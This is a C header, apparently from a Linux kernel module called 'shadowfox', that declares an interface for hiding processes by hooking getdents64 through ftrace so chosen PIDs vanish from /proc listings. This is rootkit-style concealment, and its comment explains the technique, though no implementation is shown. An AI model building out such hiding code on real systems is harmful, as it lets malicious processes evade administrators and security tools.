/* SPDX-License-Identifier: GPL-2.0 */
#ifndef _SHADOWFOX_HIDE_PROC_H
#define _SHADOWFOX_HIDE_PROC_H

#include <linux/types.h>

/*
 * Process concealment via ftrace hook on __x64_sys_getdents64.
 *
 * sf_proc_init() installs the hook (foreground only — no PIDs are
 * hidden until sf_proc_hide_pid is called). sf_proc_exit() removes
 * the hook and clears the hidden-PID list.
 *
 * sf_proc_hide_pid(pid) adds a PID to the hidden set. From that
 * point on, getdents64() calls on directories where a directory
 * entry has that PID's numeric name will skip that entry. The
 * primary observable effect is that `ls /proc/<pid>` (typed
 * blindly) still works, but `ls /proc/ | grep <pid>` produces no
 * match — concealment is at enumeration level, not at access level.
 *
 * Refuses to hide PID 1 (init) to prevent foot-shooting.
 *
 * Returns 0 on success or a negative errno.
 */
int sf_proc_init(void);
void sf_proc_exit(void);

int sf_proc_hide_pid(pid_t pid);
int sf_proc_show_pid(pid_t pid);
void sf_proc_clear_hidden(void);

#endif /* _SHADOWFOX_HIDE_PROC_H */
